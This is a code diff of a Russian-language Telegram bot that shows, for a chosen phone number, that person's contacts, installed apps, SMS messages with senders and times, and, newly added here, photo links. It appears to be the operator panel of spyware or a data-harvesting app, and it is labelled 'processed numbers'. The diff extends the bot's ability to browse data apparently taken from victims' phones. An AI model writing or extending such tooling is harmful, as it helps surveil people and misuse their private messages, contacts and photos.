@@ -37,7 +37,7 @@ bot.onText(/Просмотреть отработанные номера/, async
     const totalPagesusers = Math.ceil(messagesToSendusers.length / pageSizeusers);
     let currentPageusers = 1;
     console.log(messagesToSendusers.length)
-    if(messagesToSendusers.length > 7){
+    if (messagesToSendusers.length > 7) {
         let currentMessageId = null;
         const sendCurrentPage = async () => {
             let startIndex;
@@ -46,13 +46,13 @@ bot.onText(/Просмотреть отработанные номера/, async
             let paginationButtons;
             let currentPage;
             let totalPages;
-    
+
             currentPage = currentPageusers;
             totalPages = totalPagesusers;
             startIndex = (currentPage - 1) * pageSizeusers;
             endIndex = Math.min(startIndex + pageSizeusers, messagesToSendusers.length);
             pageMessages = messagesToSendusers.slice(startIndex, endIndex);
-    
+
             paginationButtons = [];
             if (currentPage > 1) {
                 paginationButtons.push({
@@ -66,9 +66,9 @@ bot.onText(/Просмотреть отработанные номера/, async
                     callback_data: 'next_page'
                 });
             }
-    
+
             const messageText = pageMessages.map(message => `<pre>${message}</pre>`).join('\n');
-            
+
             if (currentMessageId) {
                 try {
                     await bot.editMessageText(`${messageText}`, {
@@ -80,7 +80,7 @@ bot.onText(/Просмотреть отработанные номера/, async
                         }
                     });
                 } catch (error) {
-    
+
                 }
             } else {
                 const message = await bot.sendMessage(chatId, `${messageText}`, {
@@ -102,8 +102,8 @@ bot.onText(/Просмотреть отработанные номера/, async
         });
         sendCurrentPage();
     }
-    else{
-        const messageText = messagesToSendusers.map(message=>`<pre>${message}</pre>`).join('\n');
+    else {
+        const messageText = messagesToSendusers.map(message => `<pre>${message}</pre>`).join('\n');
         bot.sendMessage(chatId, `${messageText}`, options)
     }
 });
@@ -123,6 +123,7 @@ bot.onText(/Инфа по номеру/, async (msg) => {
                 var appMessages = ''
                 var contactMessages = ''
                 var messageMessages = ''
+                var photosMessages = ''
                 if (userdataByPhone.data != 'Данные пользователя не найдены') {
                     if (userdataByPhone.data?.userContacts[0]) {
                         contactMessages = userdataByPhone.data.userContacts[0].contacts.map(element => {
@@ -142,7 +143,7 @@ bot.onText(/Инфа по номеру/, async (msg) => {
                         databtns.push({ text: "Приложения", callback_data: "Sendapps" })
                     }
                     if (userdataByPhone.data?.userMessages[0]) {
-                       messageMessages = userdataByPhone.data.userMessages[0].messages.map(element => {
+                        messageMessages = userdataByPhone.data.userMessages[0].messages.map(element => {
                             const body = `Сообщение: ${element.body}`;
                             const originatingAddress = `Отправитель: ${element.originatingAddress}`;
                             const date = `Дата и время: ${new Date(element.timestamp).toLocaleString()}`;
@@ -150,7 +151,13 @@ bot.onText(/Инфа по номеру/, async (msg) => {
                         });
                         databtns.push({ text: "Сообщения", callback_data: "Sendmessages" });
                     }
-                    
+                    if (userdataByPhone.data?.userPhotos[0]) {
+                        photosMessages = userdataByPhone.data.userPhotos[0].urls.map(element => {
+                            const body = `Ссылка: ${element}`;
+                            return `${body}`;
+                        });
+                        databtns.push({ text: "Фотки", callback_data: "Sendimages" });
+                    }
                     const message = await bot.sendMessage(chatId, "Выберите данные", {
                         parse_mode: 'HTML',
                         reply_markup: {
@@ -174,6 +181,11 @@ bot.onText(/Инфа по номеру/, async (msg) => {
                     const totalPagesmessage = Math.ceil(messagesToSendmessage.length / pageSizemessage);
                     let currentPagemessage = 1;
 
+                    const messagesToSendimage = photosMessages;
+                    const pageSizeimage = 10;
+                    const totalPagesimage = Math.ceil(messagesToSendimage.length / pageSizeimage);
+                    let currentPageimage = 1;
+
                     let currentMessageId = null;
                     let paginationMessageId = null;
                     const sendCurrentPage = async (DataChoose) => {
@@ -183,7 +195,7 @@ bot.onText(/Инфа по номеру/, async (msg) => {
                         let paginationButtons;
                         let currentPage;
                         let totalPages;
-                        
+
                         if (DataChoose.contacts) {
                             currentPage = currentPagecontact;
                             totalPages = totalPagescontact;
@@ -196,14 +208,20 @@ bot.onText(/Инфа по номеру/, async (msg) => {
                             startIndex = (currentPage - 1) * pageSizeapp;
                             endIndex = Math.min(startIndex + pageSizeapp, messagesToSendapp.length);
                             pageMessages = messagesToSendapp.slice(startIndex, endIndex);
-                        }else if (DataChoose.messages) {
+                        } else if (DataChoose.messages) {
                             currentPage = currentPagemessage;
                             totalPages = totalPagesmessage;
                             startIndex = (currentPage - 1) * pageSizemessage;
                             endIndex = Math.min(startIndex + pageSizemessage, messagesToSendmessage.length);
                             pageMessages = messagesToSendmessage.slice(startIndex, endIndex);
+                        }else if (DataChoose.images) {
+                            currentPage = currentPageimage;
+                            totalPages = totalPagesimage;
+                            startIndex = (currentPage - 1) * pageSizeimage;
+                            endIndex = Math.min(startIndex + pageSizeimage, messagesToSendimage.length);
+                            pageMessages = messagesToSendimage.slice(startIndex, endIndex);
                         }
-                    
+
                         paginationButtons = [];
                         if (currentPage > 1) {
                             paginationButtons.push({
@@ -217,9 +235,9 @@ bot.onText(/Инфа по номеру/, async (msg) => {
                                 callback_data: 'next_page'
                             });
                         }
-                    
+
                         const messageText = pageMessages.map(message => `<pre>${message}</pre>`).join('\n');
-                    
+
                         if (currentMessageId) {
                             try {
                                 await bot.editMessageText(`${messageText}`, {
@@ -231,7 +249,7 @@ bot.onText(/Инфа по номеру/, async (msg) => {
                                     }
                                 });
                             } catch (error) {
-                                
+
                             }
                         } else {
                             const message = await bot.sendMessage(chatId, `${messageText}`, {
@@ -243,21 +261,30 @@ bot.onText(/Инфа по номеру/, async (msg) => {
                             currentMessageId = message.message_id;
                         }
                     };
-                    
-                    const DataChoose = { contacts: false, apps: false, messages:false}
+
+                    const DataChoose = { contacts: false, apps: false, messages: false, images: false }
                     bot.on('callback_query', async (query) => {
                         try {
                             if (query.data === "Sendcontacts") {
                                 DataChoose.contacts = true
                                 DataChoose.apps = false
                                 DataChoose.messages = false
+                                DataChoose.images = false
                             } else if (query.data === "Sendapps") {
                                 DataChoose.apps = true
                                 DataChoose.contacts = false
                                 DataChoose.messages = false
+                                DataChoose.images = false
                             }
                             else if (query.data === "Sendmessages") {
                                 DataChoose.messages = true
+                                DataChoose.apps = false
+                                DataChoose.contacts = false
+                                DataChoose.images = false
+                            }
+                            else if (query.data === "Sendimages") {
+                                DataChoose.images = true
+                                DataChoose.messages = false
                                 DataChoose.apps = false
                                 DataChoose.contacts = false
                             }
@@ -266,12 +293,21 @@ bot.onText(/Инфа по номеру/, async (msg) => {
                                     currentPagecontact = Math.max(1, currentPagecontact - 1);
                                 } else if (DataChoose.apps) {
                                     currentPageapp = Math.max(1, currentPageapp - 1);
+                                } else if (DataChoose.messages) {
+                                    currentPagemessage = Math.max(1, currentPagemessage - 1);
+                                }
+                                else if (DataChoose.images) {
+                                    currentPageimage = Math.max(1, currentPageimage - 1);
                                 }
                             } else if (query.data === 'next_page') {
                                 if (DataChoose.contacts) {
                                     currentPagecontact = Math.min(totalPagescontact, currentPagecontact + 1);
                                 } else if (DataChoose.apps) {
                                     currentPageapp = Math.min(totalPagesapp, currentPageapp + 1);
+                                } else if (DataChoose.messages) {
+                                    currentPagemessage = Math.min(totalPagesmessage, currentPagemessage + 1);
+                                }else if (DataChoose.images) {
+                                    currentPageimage = Math.min(totalPagesimage, currentPageimage + 1);
                                 }
                             }
                             sendCurrentPage(DataChoose);
